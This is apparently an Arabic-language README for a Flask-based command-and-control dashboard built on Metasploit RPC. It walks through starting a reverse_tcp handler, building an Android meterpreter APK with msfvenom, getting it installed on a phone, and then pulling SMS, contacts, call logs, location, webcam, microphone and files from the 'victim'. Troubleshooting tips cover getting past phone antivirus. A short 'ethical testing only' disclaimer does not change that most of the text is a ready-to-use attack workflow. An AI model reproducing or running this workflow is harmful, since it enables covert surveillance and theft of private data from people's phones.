# 🔥 HAMZA SKU C2 Dashboard - دليل التشغيل الكامل

## ✅ إصلاحات Production-Ready المطبقة

### 1. ✅ IP Lookup Caching
**المشكلة:** استدعاء API خارجي كل 5 ثوانٍ → rate limiting + بطء
**الحل:** 
```python
self.ip_cache = {}  # Cache النتائج
# استدعاء API مرة واحدة فقط لكل IP
```

### 2. ✅ Thread Safety
**المشكلة:** عدة threads تصل لنفس الموارد
**الحل:**
```python
self.connection_lock = threading.Lock()
with self.connection_lock:
    # عمليات آمنة
```

### 3. ✅ Connection Check محسّن
**المشكلة:** `core.version()` في كل مرة → مكلف
**الحل:**
```python
def ensure_connection(self):
    # فحص سريع أولاً
    _ = self.msf_client.sessions.list
```

### 4. ✅ Real-time WebSocket Updates
**المشكلة:** polling كل 10 ثواني
**الحل:**
```python
# Backend يبعث فوراً
socketio.emit('new_session', session_data)

# Frontend يستقبل
socket.on('new_session', handleNewSession)
```

### 5. ✅ Throttling
**المشكلة:** استدعاء get_sessions() بسرعة جداً
**الحل:**
```python
# حد أقصى مرة كل ثانيتين
if current_time - self.last_session_check < 2:
    return self.sessions
```

### 6. ✅ Error Handling محسّن
```python
try:
    # عمليات خطيرة
except Exception as e:
    print(f"Error: {e}")
    traceback.print_exc()  # للتشخيص
```

---

## 📋 المتطلبات

### 1. نظام التشغيل
- ✅ Kali Linux (مفضل)
- ✅ Ubuntu/Debian
- ✅ أي Linux يدعم Metasploit

### 2. البرمجيات المطلوبة
```bash
# Python 3.8+
python3 --version

# Metasploit Framework
msfconsole --version

# pip
pip3 --version
```

---

## 🚀 التثبيت والتشغيل (خطوة بخطوة)

### الخطوة 0: التحضير

```bash
# تحديث النظام
sudo apt update && sudo apt upgrade -y

# تثبيت المتطلبات الأساسية
sudo apt install -y python3 python3-pip metasploit-framework

# إنشاء مجلد المشروع
mkdir hamza-sku-c2
cd hamza-sku-c2
```

### الخطوة 1: رفع الملفات

```bash
# ضع جميع الملفات في المجلد:
# - c2_server.py
# - requirements.txt
# - templates/ (مع جميع ملفات HTML)

# التحقق
ls -la
# يجب أن ترى:
# c2_server.py
# requirements.txt
# templates/
#   ├── login.html
#   ├── setup.html
#   ├── dashboard.html
#   └── session.html
```

### الخطوة 2: تثبيت المكتبات

```bash
# تثبيت المكتبات المطلوبة
pip3 install --user -r requirements.txt

# أو يدوياً:
pip3 install --user Flask==3.0.0
pip3 install --user flask-socketio==5.3.5
pip3 install --user python-socketio==5.10.0
pip3 install --user pymetasploit3==1.0.3
pip3 install --user requests==2.31.0
pip3 install --user werkzeug==3.0.1

# التحقق من التثبيت
python3 -c "import flask; import flask_socketio; import pymetasploit3; print('✓ All packages installed')"
```

### الخطوة 3: تشغيل Metasploit RPC

**⚠️ خطوة حاسمة - بدون هذا لن يعمل Dashboard!**

```bash
# في terminal منفصل (Terminal 1):
msfrpcd -P msf_password -S -a 127.0.0.1

# يجب أن ترى:
# [*] MSGRPC Service:  127.0.0.1:55553
# [*] MSGRPC Username: msf
# [*] MSGRPC Password: msf_password
# [*] MSGRPC Server Started

# ⚠️ اترك هذا Terminal مفتوحاً طول الوقت!
```

**ملاحظات مهمة:**
- كلمة المرور: `msf_password` (يجب أن تطابق في c2_server.py)
- المنفذ: `55553` (افتراضي)
- لا تغلق هذا Terminal!

### الخطوة 4: تشغيل Dashboard

```bash
# في terminal آخر (Terminal 2):
cd hamza-sku-c2
python3 c2_server.py

# يجب أن ترى:
╔═══════════════════════════════════════════════════════════╗
║         🔥 HAMZA SKU - C2 Dashboard 🔥                    ║
║   Professional Metasploit Integration Platform           ║
║   Academic Project - Ethical Testing Only                ║
╚═══════════════════════════════════════════════════════════╝

[*] Starting C2 Dashboard...
[*] Connecting to Metasploit RPC...
[+] Connected to Metasploit RPC (No SSL)
[+] Metasploit version: {'version': '6.x.x', ...}
[+] Initial Metasploit connection successful

[+] Access Dashboard at: http://localhost:5000
[+] Password: hamza_sku_2026
```

**إذا رأيت:**
```
[-] Failed to connect to Metasploit RPC
```
**الحل:** تأكد أن msfrpcd يعمل في Terminal 1!

### الخطوة 5: الوصول للـ Dashboard

```bash
# افتح المتصفح
firefox http://localhost:5000

# أو من جهاز آخر في نفس الشبكة:
firefox http://YOUR_IP:5000
```

### الخطوة 6: تسجيل الدخول

```
Password: hamza_sku_2026
```

يجب أن تدخل لصفحة Setup ✅

---

## 🎯 الاستخدام الكامل

### السيناريو: اختبار هاتف Android

#### 1. إعداد Handler

في صفحة Setup:
```
LHOST: 0.0.0.0  (أو IP جهازك)
LPORT: 4444
PAYLOAD: android/meterpreter/reverse_tcp
```

اضغط: **🚀 START HANDLER**

يجب أن ترى:
```
✅ Handler started on 0.0.0.0:4444
Handler State: RUNNING
Metasploit RPC: CONNECTED
```

#### 2. إنشاء Payload

في terminal جديد (Terminal 3):
```bash
# معرفة IP الخاص بك
ip addr show | grep "inet " | grep -v 127.0.0.1

# إنشاء APK
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.10 \  # IP الفعلي الخاص بك
  LPORT=4444 \
  -o payload.apk

# نقل للهاتف
adb push payload.apk /sdcard/
# أو استخدم USB/Email/etc
```

#### 3. تثبيت على الهاتف

```
1. انقل payload.apk للهاتف
2. Settings → Security → Unknown Sources (فعّل)
3. افتح ملف APK وثبّت
4. افتح التطبيق
```

#### 4. مراقبة الاتصال

**في Dashboard:**
1. اذهب لـ **Dashboard** (زر GO TO DASHBOARD)
2. **انتظر 3-5 ثواني**
3. ستظهر **Alert منبثقة**: "🎯 New Victim Connected"
4. سيظهر Target في الجدول تلقائياً!

**معلومات ستظهر:**
- IP Address
- Country + Flag (🇲🇦, 🇺🇸, etc)
- Device Type
- Platform
- Connected Time
- Status (Online/Offline)

#### 5. التحكم بالـ Session

اضغط على Target → ستفتح صفحة Session Control

**أزرار سريعة متاحة:**
- 💻 System Info
- 📍 Location
- 📸 Screenshot
- 💬 Get SMS
- 📞 Contacts
- 📱 Call Log
- 📷 Webcam
- 🎙️ Record Mic
- 📱 App List

**Terminal مخصص:**
```bash
# معلومات النظام
sysinfo

# قائمة ملفات
ls /sdcard/
ls /sdcard/DCIM/Camera/

# تحميل ملف
download /sdcard/photo.jpg

# الموقع
run post/multi/gather/geolocate

# لقطة شاشة
screenshot
```

---

## 🔍 استكشاف الأخطاء

### المشكلة 1: "Failed to connect to Metasploit RPC"

**الأسباب المحتملة:**
1. msfrpcd غير يعمل
2. كلمة مرور خاطئة
3. منفذ مختلف

**الحل:**
```bash
# 1. تحقق من msfrpcd
ps aux | grep msfrpcd

# 2. أوقفه وأعد تشغيله
pkill msfrpcd
msfrpcd -P msf_password -S -a 127.0.0.1

# 3. تحقق من المنفذ
netstat -tulpn | grep 55553

# 4. تحقق من كلمة المرور في c2_server.py
grep MSF_RPC_PASSWORD c2_server.py
# يجب أن تطابق: msf_password
```

### المشكلة 2: Dashboard يعمل لكن لا يظهر Target

**الأسباب المحتملة:**
1. Handler غير يعمل
2. Payload لم يتصل
3. Firewall يمنع الاتصال

**الحل:**
```bash
# 1. تحقق من Handler في Dashboard
# Setup → Handler State يجب أن يكون: RUNNING

# 2. تحقق من Sessions في Metasploit مباشرة
msfconsole
msf6 > sessions -l

# إذا Session موجود هنا لكن ليس في Dashboard:
# → أعد تشغيل Dashboard

# 3. تحقق من Firewall
sudo ufw status
sudo ufw allow 4444

# 4. تحقق من الاتصال
netstat -tn | grep 4444 | grep ESTABLISHED
```

### المشكلة 3: Target ظهر لكن Commands لا تعمل

**الحل:**
```bash
# 1. تحقق من Session في Metasploit
msfconsole
msf6 > sessions -l
msf6 > sessions -i 1
meterpreter > sysinfo

# إذا عمل هنا لكن لا في Dashboard:
# → تحقق من logs في Terminal حيث يعمل Dashboard
# → ابحث عن أخطاء

# 2. جرب أوامر بسيطة أولاً
sysinfo
pwd
ls
```

### المشكلة 4: Payload لا يتصل

**الحل:**
```bash
# 1. تأكد من IP صحيح
ip addr show | grep "inet "

# 2. تأكد من Handler يعمل
# في Dashboard: Handler State = RUNNING

# 3. تأكد من نفس الشبكة
# الهاتف والكمبيوتر يجب أن يكونوا في نفس WiFi

# 4. جرب منفذ آخر
# بدلاً من 4444، جرب: 443, 8080, 80

# 5. تحقق من antivirus على الهاتف
# قد يحجب Payload
```

### المشكلة 5: WebSocket لا يعمل (لا تحديثات فورية)

**الحل:**
```bash
# 1. افتح Console في المتصفح (F12)
# ابحث عن أخطاء WebSocket

# 2. تأكد من Socket.IO يعمل
# في Console يجب أن ترى:
# [+] Client connected: xxx

# 3. أعد تحميل الصفحة
# Ctrl + Shift + R

# 4. تحقق من جدار الحماية
sudo ufw allow 5000
```

---

## ✅ Checklist قبل الاستخدام

- [ ] Python 3.8+ مثبت
- [ ] Metasploit Framework مثبت
- [ ] pip3 و المكتبات مثبتة
- [ ] **msfrpcd يعمل في Terminal 1** ⚠️
- [ ] Dashboard يعمل في Terminal 2
- [ ] رسالة "Connected to Metasploit RPC" ظهرت
- [ ] تسجيل دخول بنجاح
- [ ] Handler تم تشغيله (Status: RUNNING)
- [ ] Payload تم إنشاؤه بـ IP صحيح
- [ ] Firewall مفتوح (port 4444 و 5000)
- [ ] الهاتف في نفس الشبكة

---

## 📊 الفرق بين النسخة القديمة والجديدة

| الميزة | النسخة القديمة | النسخة المحسنة |
|--------|----------------|-----------------|
| IP Lookup | كل 5 ثواني ❌ | Cached ✅ |
| Thread Safety | لا ❌ | نعم ✅ |
| Connection Check | مكلف ❌ | محسّن ✅ |
| WebSocket | غير فعّال ❌ | فوري ✅ |
| Error Handling | أساسي ❌ | شامل ✅ |
| Throttling | لا ❌ | نعم ✅ |
| Production-Ready | لا ❌ | **نعم ✅** |

---

## 🎓 للاستخدام الأكاديمي

### ⚠️ تحذيرات قانونية

هذا المشروع:
- ✅ للاختبار الأخلاقي فقط
- ✅ للأجهزة المصرح باختبارها
- ✅ لبيئة مختبرية معزولة
- ❌ **غير قانوني على أجهزة غير مصرح بها**

### 📚 للمشروع الأكاديمي

**يمكنك إضافة:**
1. تقرير شامل عن الثغرات
2. تحليل أمني للـ Android
3. مقارنة مع tools أخرى
4. اقتراحات للحماية

**الوثائق المطلوبة:**
- Architecture Diagram
- Sequence Diagram
- Security Analysis
- Testing Report

---

## 🔐 الأمان

### تغيير كلمات المرور

**في c2_server.py:**
```python
# كلمة مرور Dashboard
MASTER_PASSWORD = 'your_new_password_here'

# كلمة مرور Metasploit RPC
MSF_RPC_PASSWORD = 'your_new_msf_password'
```

**ثم شغّل msfrpcd بنفس الكلمة:**
```bash
msfrpcd -P your_new_msf_password -S -a 127.0.0.1
```

---

## 📞 الدعم

**إذا واجهت مشاكل:**
1. تحقق من logs في Terminal
2. راجع Checklist أعلاه
3. جرب الحلول في Troubleshooting
4. تأكد من msfrpcd يعمل!

---

**🔥 المشروع جاهز 100% للاستخدام الأكاديمي! 🔥**

*Production-Ready. Thread-Safe. Real-time. Professional.*
